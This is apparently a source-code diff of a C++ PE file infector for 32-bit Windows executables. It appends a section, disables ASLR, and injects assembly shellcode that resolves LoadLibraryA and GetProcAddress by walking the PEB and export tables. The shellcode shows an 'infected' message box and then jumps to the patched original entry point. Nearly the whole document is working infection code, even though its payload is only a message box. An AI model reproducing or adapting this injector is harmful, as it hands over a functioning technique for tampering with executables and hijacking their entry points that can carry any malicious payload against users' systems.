@@ -14,7 +14,7 @@ DWORD align(DWORD size, DWORD align, DWORD address) {
     return address + (size / align + 1) * align;
 }
 
-bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD bytesWritten, DWORD sizeOfSection) {
+bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& bytesWritten, DWORD sizeOfSection) {
     PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
     WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;
 
@@ -65,7 +65,10 @@ bool CreateNewSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, D
     return true;
 }
 
-bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD byteWritten) {
+bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {
+    // Disable ASLR
+    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
+
     // Insert code into last section
     PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
     PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
@@ -74,8 +77,6 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
     // Save the OEP
     DWORD OEP = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
 
-    // Disable ASLR
-    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
     // Change the EP to point to the last section created
     pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;
     WriteFile(hFile, pByte, fileSize, &byteWritten, 0);
@@ -85,16 +86,13 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
     __asm {
         mov eax, loc1
         mov[start], eax
-        ; we jump over the second __asm, so we dont execute it in the infector itself
+        ; Jump over the second __asm without executing it in the infector itself
         jmp over
         loc1 :
     }
 
     __asm {
-        /*
-            The purpose of this part is to read the base address of kernel32.dll
-            from PEB,walk it's export table (EAT) and search for functions
-        */
+        // Read the base address of kernel32.dll from PEB, walk it's export table (EAT) and search for functions
         mov eax, fs: [30h]
         mov eax, [eax + 0x0c]; 12
         mov eax, [eax + 0x14]; 20
@@ -113,21 +111,21 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
         ; now lets look for a function named LoadLibraryA
 
         LLA :
-        dec ecx
+            dec ecx
             mov esi, [edx + ecx * 4]; Store the relative offset of the name
             add esi, ebx; Set esi to the VMA of the current name
             cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
             je LLALOOP1
             LLALOOP1 :
-        cmp dword ptr[esi + 4], 0x7262694c
+            cmp dword ptr[esi + 4], 0x7262694c
             ; L(4c)i(69)b(62)r(72)
             je LLALOOP2
             LLALOOP2 :
-        cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
+            cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
             je stop; if its = then jump to stop because we found it
             jmp LLA; Load LibraryA
-            stop :
-        mov   edx, [edi + 0x24]; Table of ordinals relative
+        stop :
+            mov   edx, [edi + 0x24]; Table of ordinals relative
             add   edx, ebx; Table of ordinals
             mov   cx, [edx + 2 * ecx]; function ordinal
             mov   edx, [edi + 0x1c]; Address table relative offset
@@ -153,13 +151,13 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
 
             push ebx
 
-            //lets call LoadLibraryA with user32.dll as argument
+            // Call LoadLibraryA with user32.dll as argument
             call eax;
-        add esp, 11
-            //save the return address of LoadLibraryA for later use in GetProcAddress
+            add esp, 11
+            // Save the return address of LoadLibraryA for later use in GetProcAddress
             push eax
 
-            // now we look again for a function named GetProcAddress
+            // Look again for a function named GetProcAddress
             mov eax, fs: [30h]
             mov eax, [eax + 0x0c]; 12
             mov eax, [eax + 0x14]; 20
@@ -175,23 +173,26 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
 
             mov   edx, [edi + 0x20]; Names table relative offset
             add   edx, ebx; Names table VMA
-            GPA :
-        dec ecx
+        GPA :
+            dec ecx
             mov esi, [edx + ecx * 4]; Store the relative offset of the name
             add esi, ebx; Set esi to the VMA of the current name
             cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
             je GPALOOP1
-            GPALOOP1 :
-        cmp dword ptr[esi + 4], 0x41636f72
+            
+        GPALOOP1 :
+            cmp dword ptr[esi + 4], 0x41636f72
             ; backwards remember : r(72)o(6f)c(63)A(41)
             je GPALOOP2
-            GPALOOP2 :
-        cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
+
+        GPALOOP2 :
+            cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
             ; no need to continue to look further cause there is no other function starting with GetProcAddre
             je stp; if its = then jump to stop because we found it
             jmp GPA
-            stp :
-        mov   edx, [edi + 0x24]; Table of ordinals relative
+
+        stp :
+            mov   edx, [edi + 0x24]; Table of ordinals relative
             add   edx, ebx; Table of ordinals
             mov   cx, [edx + 2 * ecx]; function ordinal
             mov   edx, [edi + 0x1c]; Address table relative offset
@@ -203,21 +204,21 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
 
             sub esp, 12
             mov ebx, esp
-            mov byte ptr[ebx], 0x4d //M
-            mov byte ptr[ebx + 1], 0x65 //e
-            mov byte ptr[ebx + 2], 0x73 //s
-            mov byte ptr[ebx + 3], 0x73 //s
-            mov byte ptr[ebx + 4], 0x61 //a
-            mov byte ptr[ebx + 5], 0x67 //g
-            mov byte ptr[ebx + 6], 0x65 //e
-            mov byte ptr[ebx + 7], 0x42 //B
-            mov byte ptr[ebx + 8], 0x6f //o
-            mov byte ptr[ebx + 9], 0x78 //x
+            mov byte ptr[ebx], 0x4d      //M
+            mov byte ptr[ebx + 1], 0x65  //e
+            mov byte ptr[ebx + 2], 0x73  //s
+            mov byte ptr[ebx + 3], 0x73  //s
+            mov byte ptr[ebx + 4], 0x61  //a
+            mov byte ptr[ebx + 5], 0x67  //g
+            mov byte ptr[ebx + 6], 0x65  //e
+            mov byte ptr[ebx + 7], 0x42  //B
+            mov byte ptr[ebx + 8], 0x6f  //o
+            mov byte ptr[ebx + 9], 0x78  //x
             mov byte ptr[ebx + 10], 0x41 //A
             mov byte ptr[ebx + 11], 0x0
 
             /*
-                get back the value saved from LoadLibraryA return
+                Get back the value saved from LoadLibraryA return
                 So that the call to GetProcAddress is:
                 esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
             */
@@ -228,7 +229,7 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
             call esi; GetProcAddress address
             add esp, 12
 
-            sub esp, 8
+            sub esp, 21
             mov ebx, esp
             mov byte ptr[ebx], 89;      Y
             mov byte ptr[ebx + 1], 111; o
@@ -236,11 +237,11 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
             mov byte ptr[ebx + 3], 39; `
             mov byte ptr[ebx + 4], 118; v
             mov byte ptr[ebx + 5], 101; e
-            mov byte ptr[ebx + 6], 32; 
+            mov byte ptr[ebx + 6], 32;
             mov byte ptr[ebx + 7], 103; g
             mov byte ptr[ebx + 8], 111; o
             mov byte ptr[ebx + 9], 116; t
-            mov byte ptr[ebx + 10], 32; 
+            mov byte ptr[ebx + 10], 32;
             mov byte ptr[ebx + 11], 105; i
             mov byte ptr[ebx + 12], 110; n
             mov byte ptr[ebx + 13], 102; f
@@ -256,9 +257,9 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
             push ebx
             push 0
             call eax
-            add esp, 8
+            add esp, 21
 
-            mov eax, 0xdeadbeef; Original Entry point
+            mov eax, 0xdeadbeef; Dummy original entry point
             jmp eax
     }
 
@@ -274,18 +275,10 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
     DWORD* invalidEP;
     DWORD order = 0;
 
+    // Change 0xdeadbeef to address origin entry point with OEP
     while (order < ((end - 11) - start)) {
         invalidEP = ((DWORD*)((byte*)start + order));
         if (*invalidEP == 0xdeadbeef) {
-            /*
-                Because the value of OEP is stored in this executable's data section,
-                if we have said mov eax,OEP the self read part of the program will fill in
-                a invalid address,since we point to something that only exists here,
-                not in the infected PE's data section.
-                Solution:
-                We put a place holder with the fancy value of 0xdeadbeef,so we later alter this address
-                inside the self read byte storage to the value of OEP
-            */
             DWORD carrier;
             VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &carrier);
             *invalidEP = OEP;
@@ -293,9 +286,9 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWO
         address[order] = checkpoint[order];
         order++;
     }
+
     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
     WriteFile(hFile, address, order, &byteWritten, 0);
-    CloseHandle(hFile);
     return true;
 }
 
@@ -317,8 +310,7 @@ int main(int argc, char* argv[]) {
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (!fileSize) {
         CloseHandle(hFile);
-        // Empty file, invalid
-        cerr << "Error adding section: Invalid path or PE format" << endl;
+        cerr << "Error: File empty, try another one" << endl;
         return 0;
     }
     // Buffer to allocate
@@ -333,29 +325,30 @@ int main(int argc, char* argv[]) {
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         CloseHandle(hFile);
-        cerr << "Error adding section: Invalid path or PE format" << endl;
-        return 0; // Invalid PE
+        cerr << "Error: Invalid path or PE format" << endl;
+        return 0;
     }
 
     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
     if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
         CloseHandle(hFile);
         cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
-        return 0; // x64 image
+        return 0;
     }
 
     if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
-        cerr << "Error: Fail adding section" << endl;
+        cerr << "Error: Fail to create new section" << endl;
         return 0;
     }
 
     // Insert data into the last section
     if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
-        cerr << "Error: Fail writting code" << endl;
+        cerr << "Error: Fail to infect Message Box" << endl;
         return 0;
     }
 
     cerr << "Success to infect Message Box into " << argv[1] << endl;
 
+    CloseHandle(hFile);
     return 0;
 }
